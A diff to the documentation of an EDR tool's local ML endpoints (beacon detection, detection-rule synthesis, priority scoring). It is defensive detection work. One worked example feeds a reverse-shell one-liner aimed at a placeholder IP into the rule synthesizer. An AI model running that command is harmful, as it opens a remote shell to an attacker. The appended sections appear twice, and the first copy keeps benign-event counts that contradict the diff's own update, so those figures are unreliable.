@@ -41,8 +41,8 @@ Supports process, file and network events.
 1. Tokenise the source (executable basename, parent, command tokens and bigrams, path pieces,
    destination host/port).
 2. Count how many benign events each candidate substring matches. The benign set is
-   `testdata/benign_corpus.json` (embedded, 1611 events), the negative samples of every embedded
-   content pack and the custom-content benign baseline (3167 events total).
+   `testdata/benign_corpus.json` (embedded, 1,719 events at this revision), the negative samples of every embedded
+   content pack and the custom-content benign baseline (the total is reported live in `benign_check`).
 3. Greedy conjunction: anchor on the executable name (process), then repeatedly add the candidate
    that removes the most remaining benign matches (ties: flags/paths over plain tokens, instance
    IP literals last, longer pattern), up to 4 conditions, prune unneeded ones, minimum 2.
@@ -98,7 +98,7 @@ threshold 60:
 
 `go test ./internal/edr -run TestSynthesize -v`: 28 varied source events (process, file,
 network; Linux, macOS, Windows). All 28 produce rules that pass `validateCustomRule`, match the
-source and match 0 of the 3167 benign events under every event kind; unrelated sources do not
+source and match 0 of the benign events under every event kind; unrelated sources do not
 cross-match (at most 2 allowed). Generic benign input is refused (422).
 
 ## Honest limits
@@ -113,3 +113,93 @@ cross-match (at most 2 allowed). Generic benign input is refused (422).
   proof of low false positives; conditions can be instance-specific (a file name, a one-off IP).
   They are drafts: review, then run in `testing` lifecycle.
 - Priority weights are hand-set, not learned. Rarity is only as good as the provider.
+
+## Worked examples
+
+```sh
+curl -s -H "Authorization: Bearer $KAVACH_TOKEN" \
+  "http://127.0.0.1:8099/v1/ml/beacons?host=ws-01&min_events=8&exclude_private=1&limit=5"
+# {"mode":"observe-only","model":"statistical-beacon-v1","min_events":8,"suspect_score":60,"high_score":80,
+#  "series_scored":N,"not_enough_data":M,"excluded_benign_periodic":K,"exclude_private":true,
+#  "suspects":[{host, destination, events, period_sec, score, level, factors...}]}
+
+curl -s -X POST -H "Authorization: Bearer $KAVACH_TOKEN" -H 'Content-Type: application/json' \
+  -d '{"command":"bash -i >& /dev/tcp/198.51.100.7/4444 0>&1"}' http://127.0.0.1:8099/v1/ml/synthesize
+# 200: {"rule":{...},"validation":{...},"conditions":[...],"benign_check":{...},"saved":false,"enabled":false,
+#       "recommended_initial_lifecycle":"testing", ...}
+# 422 when no 2-4 condition conjunction reaches zero benign matches; 400 unless exactly one of
+# finding_id|command|event is supplied; 404 for an unknown finding_id.
+
+curl -s -H "Authorization: Bearer $KAVACH_TOKEN" "http://127.0.0.1:8099/v1/ml/priority?finding_id=F123"
+# {"mode":"observe-only","model":"priority-fusion-v1","weights":{...},"note":"...",
+#  "priority":{"finding_id":"F123","host":"...","rule":"...","severity":"high","score":61.3,"level":"high",
+#              "coverage":0.65,"factors":[{"name":"severity","value":0.8,"weight":0.3,"note":"..."}],"omitted":["rarity: ..."]}}
+curl -s -H "Authorization: Bearer $KAVACH_TOKEN" "http://127.0.0.1:8099/v1/ml/priority?host=ws-01&limit=20"
+```
+
+Priority without `finding_id` returns `{total, priorities: [...]}` sorted by score, `limit` 1-500 (default 50), `host` filter. Unknown `finding_id` is 404. The score and the numbers above are illustrative of the response shape.
+
+## Priority factors: what the code actually does
+
+Weights in `mlPriorityWeights` (`ml_net.go`, with the two appends in `exposure.go` and `ml_ext_engine.go`):
+
+| factor | weight | source |
+|---|---|---|
+| severity | 0.30 | rule severity |
+| rarity | 0.20 | `mlRarityProvider` (lineage model) |
+| beaconing | 0.20 | beacon series for the finding's (host, destination) |
+| asset_criticality | 0.15 | `/v1/posture/assets` |
+| rule_trust | 0.15 | rule health noisy score; replaced by analyst-verdict shrunk precision when enough verdicts exist (`feedbackRuleTrust`) |
+| exposure | 0.10 | only when `KAVACH_EXPOSURE_PRIORITY=1` and the host has an SBOM, see [exposure.md](exposure.md) |
+| dns_anomaly, user_behaviour, peer_outlier, rule_fatigue | 0.10, 0.08, 0.07, 0.05 | extended models |
+
+**Known issue (confirmed by reading the code, not changed here):** the extended factors are computed by a hook that runs after the weighted sum has been taken (`ctx.score` in `ml_net.go`). Their values are put into a local map that is never read afterwards, so they do not change `score`, `coverage` or `factors`; only their omission notes appear in `omitted`. Until fixed, only the five base factors and `exposure` influence the score. See the matching note in [local-models.md](local-models.md).
+
+## Limits at a glance
+
+Beacons: `min_events` default 8 (floor 4), 12-bin histogram over [0, 3 x median], confidence saturates at 20 events, `suspect` >= 60, `high` >= 80. Synthesis: at most 4 conditions (minimum 2), severity capped at `medium`, benign set of 3,167 events (1,611 corpus events plus embedded content-pack negatives and custom benign baseline), the call never saves or enables a rule. Priority: advisory, 0-100, levels low < 35, medium 35-55, high 55-75, critical >= 75. These endpoints persist nothing; the optional allowlist file `<store path>.beacon_allowlist.json` is only read.
+
+## Worked examples
+
+```sh
+curl -s -H "Authorization: Bearer $KAVACH_TOKEN" \
+  "http://127.0.0.1:8099/v1/ml/beacons?host=ws-01&min_events=8&exclude_private=1&limit=5"
+# {"mode":"observe-only","model":"statistical-beacon-v1","min_events":8,"suspect_score":60,"high_score":80,
+#  "series_scored":N,"not_enough_data":M,"excluded_benign_periodic":K,"exclude_private":true,
+#  "suspects":[{host, destination, events, period_sec, score, level, factors...}]}
+
+curl -s -X POST -H "Authorization: Bearer $KAVACH_TOKEN" -H 'Content-Type: application/json' \
+  -d '{"command":"bash -i >& /dev/tcp/198.51.100.7/4444 0>&1"}' http://127.0.0.1:8099/v1/ml/synthesize
+# 200: {"rule":{...},"validation":{...},"conditions":[...],"benign_check":{...},"saved":false,"enabled":false,
+#       "recommended_initial_lifecycle":"testing", ...}
+# 422 when no 2-4 condition conjunction reaches zero benign matches; 400 unless exactly one of
+# finding_id|command|event is supplied; 404 for an unknown finding_id.
+
+curl -s -H "Authorization: Bearer $KAVACH_TOKEN" "http://127.0.0.1:8099/v1/ml/priority?finding_id=F123"
+# {"mode":"observe-only","model":"priority-fusion-v1","weights":{...},"note":"...",
+#  "priority":{"finding_id":"F123","host":"...","rule":"...","severity":"high","score":61.3,"level":"high",
+#              "coverage":0.65,"factors":[{"name":"severity","value":0.8,"weight":0.3,"note":"..."}],"omitted":["rarity: ..."]}}
+curl -s -H "Authorization: Bearer $KAVACH_TOKEN" "http://127.0.0.1:8099/v1/ml/priority?host=ws-01&limit=20"
+```
+
+Priority without `finding_id` returns `{total, priorities: [...]}` sorted by score, `limit` 1-500 (default 50), `host` filter. Unknown `finding_id` is 404. The score and the numbers above are illustrative of the response shape.
+
+## Priority factors: what the code actually does
+
+Weights in `mlPriorityWeights` (`ml_net.go`, with the two appends in `exposure.go` and `ml_ext_engine.go`):
+
+| factor | weight | source |
+|---|---|---|
+| severity | 0.30 | rule severity |
+| rarity | 0.20 | `mlRarityProvider` (lineage model) |
+| beaconing | 0.20 | beacon series for the finding's (host, destination) |
+| asset_criticality | 0.15 | `/v1/posture/assets` |
+| rule_trust | 0.15 | rule health noisy score; replaced by analyst-verdict shrunk precision when enough verdicts exist (`feedbackRuleTrust`) |
+| exposure | 0.10 | only when `KAVACH_EXPOSURE_PRIORITY=1` and the host has an SBOM, see [exposure.md](exposure.md) |
+| dns_anomaly, user_behaviour, peer_outlier, rule_fatigue | 0.10, 0.08, 0.07, 0.05 | extended models |
+
+**Known issue (confirmed by reading the code, not changed here):** the extended factors are computed by a hook that runs after the weighted sum has been taken (`ctx.score` in `ml_net.go`). Their values are put into a local map that is never read afterwards, so they do not change `score`, `coverage` or `factors`; only their omission notes appear in `omitted`. Until fixed, only the five base factors and `exposure` influence the score. See the matching note in [local-models.md](local-models.md).
+
+## Limits at a glance
+
+Beacons: `min_events` default 8 (floor 4), 12-bin histogram over [0, 3 x median], confidence saturates at 20 events, `suspect` >= 60, `high` >= 80. Synthesis: at most 4 conditions (minimum 2), severity capped at `medium`, benign set of the embedded corpus (1,719 events) plus content-pack negatives and the custom benign baseline (total reported in `benign_check`), the call never saves or enables a rule. Priority: advisory, 0-100, levels low < 35, medium 35-55, high 55-75, critical >= 75. These endpoints persist nothing; the optional allowlist file `<store path>.beacon_allowlist.json` is only read.
